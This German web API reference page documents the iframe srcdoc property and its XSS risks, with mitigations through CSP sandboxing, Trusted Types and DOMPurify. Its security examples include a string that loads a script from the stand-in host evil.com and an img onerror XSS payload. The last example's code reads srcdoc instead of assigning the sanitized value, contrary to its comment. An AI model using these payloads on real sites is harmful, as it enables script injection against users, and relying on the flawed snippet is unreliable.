---
title: "HTMLIFrameElement: srcdoc-Eigenschaft"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
l10n:
  sourceCommit: ad01ed9218be15d7aeaa0666ec0bc2a2d17f3574
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Diese Eigenschaft analysiert ihre Eingabe als HTML und schreibt das Ergebnis in das DOM des Frames.
> APIs wie diese sind bekannt als [Injection Sinks](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) und stellen potenziell eine Angriffsfläche für [Cross-Site Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe dar, wenn die Eingabe ursprünglich von einem Angreifer stammt.
>
> Sie können dieses Risiko mindern, indem Sie immer `TrustedHTML`-Objekte anstelle von Strings zuweisen und [Trusted Types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> Siehe [Sicherheitsüberlegungen](#sicherheitsüberlegungen) für weitere Informationen.

Die **`srcdoc`**-Eigenschaft der [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement)-Schnittstelle ruft das Inline-HTML-Markup des Dokuments des Frames ab oder setzt es.

Dies spiegelt das [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attribut des {{htmlelement("iframe")}} wider.

## Wert

Das Abrufen der Eigenschaft gibt einen String zurück, der die HTML-Serialisierung des Dokuments des Frames enthält.
Dies ist `undefined`, wenn der Wert nicht gesetzt ist.

Beim Setzen der Eigenschaft wird entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder ein String akzeptiert.
Es analysiert diese Eingabe als HTML-Dokument und ersetzt den Inhalt des Frames mit dem Ergebnis.

### Ausnahmen

- `TypeError`
  - : Wird ausgelöst, wenn die Eigenschaft auf einen String gesetzt wird, während [Trusted Types](/de/docs/Web/API/Trusted_Types_API) [durch eine CSP erzwungen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) werden und keine Standardrichtlinie definiert ist.

## Beschreibung

Die **`srcdoc`**-Eigenschaft spiegelt den Inhalt des `<iframe>`-Elements [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attributs wider und kann verwendet werden, um das HTML-Dokument des {{htmlelement("iframe")}} zu setzen oder abzurufen.

Beim Setzen der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument definieren, einschließlich der {{Glossary("doctype", "Doctype-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und anderer Tags.
Beachten Sie jedoch, dass Browser normalerweise toleranter gegenüber ungültigem Markup sind und die meisten versuchen sollten, Eingaben zu rendern, die nur Body-Inhalt enthalten.

Jegliches vom Browser unterstütztes Markup wird geparst/serialisiert, einschließlich {{Glossary("shadow_tree", "Schattenwurzeln")}}.

Beachten Sie, dass wenn dies gesetzt ist, es jeden im [`src`](/de/docs/Web/API/HTMLIFrameElement/src) gesetzten Wert überschreiben wird.

### Sicherheitsüberlegungen

Die `srcdoc`-Eigenschaft ermöglicht standardmäßig jedes HTML-Markup in einem Frame auszuführen.
Wenn der Frame nicht mit der Content Security Policy (CSP) [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) eingeschränkt wird (oder eingeschränkt wird, aber den [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) Wert einschließt), dann wird er gleich-origin wie der Parent.
Das bedeutet, dass der Frame vollen Zugriff auf das Parent-DOM und Ressourcen hat und umgekehrt.

Dies ist eine bedeutende Angriffsfläche für [Cross-Site Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe, wenn möglicherweise unsichere Strings, die von einem Benutzer bereitgestellt werden, in einen Frame injiziert werden, ohne vorher bereinigt zu werden.
Betrachten Sie den folgenden Code, bei dem ein HTML-String eines Benutzers in einen Frame übergeben werden könnte, der dann dem Dokument hinzugefügt wird.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Wenn der Frame nicht darauf angewiesen ist, Zugriff auf Ihr übergeordnetes Dokument zu benötigen, können Sie das Risiko mindern, indem Sie einen CSP-Sandbox verwenden, ohne den `allow-same-origin`-Wert.
Der Frame wird dann als Cross-Origin-Ressource behandelt, und Angriffe werden erheblich eingeschränkt.
Sie können auch eine allgemeinere CSP verwenden, um die Standorte einzuschränken, von denen Skripte und andere Ressourcen abgerufen werden dürfen.

Sie können das Risiko weiter reduzieren, indem Sie immer [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekte anstelle von Strings zuweisen und [Trusted Types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) unter Verwendung der [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP-Direktive setzen.
Dadurch wird sichergestellt, dass die Eingabe durch eine Transformationsfunktion geleitet wird, die die Möglichkeit erhält, die Eingabe zu [bereinigen](/de/docs/Web/Security/Attacks/XSS#sanitization), um potenziell gefährliches Markup zu entfernen, bevor es injiziert wird.

## Beispiele

### Lesen des HTML aus einem iframe

Das Lesen von `srcdoc` verursacht, dass der User-Agent das Dokument des iframes serialisiert.

Gegeben folgendes HTML:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
```

Sie können das Markup abrufen und protokollieren, wie gezeigt:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Ersetzen der Inline-Quelle des Frames

In diesem Beispiel werden wir das Dokument eines Frames durch Zuweisung von HTML zu seiner `srcdoc`-Eigenschaft ersetzen.
Um das Risiko von XSS zu mindern, erstellen wir zuerst ein `TrustedHTML`-Objekt aus dem String, der das HTML enthält, und weisen dann dieses Objekt `srcdoc` zu.

Trusted Types werden noch nicht von allen Browsern unterstützt, daher definieren wir zuerst das [trusted types tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
Dies wirkt als transparenter Ersatz für die Trusted Types JavaScript-API:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Als Nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die ein [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML) für die Transformation eines Eingabestrings in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen definiert.
In den meisten Fällen verwenden Implementierungen von `createHTML()` eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify) zur Bereinigung der Eingabe, wie unten gezeigt:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Dann verwenden wir dieses `policy`-Objekt, um ein `TrustedHTML`-Objekt aus dem potenziell unsicheren Eingabestring zu erstellen und das Ergebnis dem Element zuzuweisen:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Während Sie direkt einen String `srcdoc` zuweisen können, stellt dies ein [Sicherheitsrisiko](#sicherheitsüberlegungen) dar, wenn der einzufügende String potenziell schädlichen Inhalt enthalten könnte.
> Sie sollten `TrustedHTML` verwenden, um sicherzustellen, dass der Inhalt bereinigt wird, bevor er eingefügt wird, und Sie sollten einen CSP-Header setzen, um [Trusted Types zu erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}
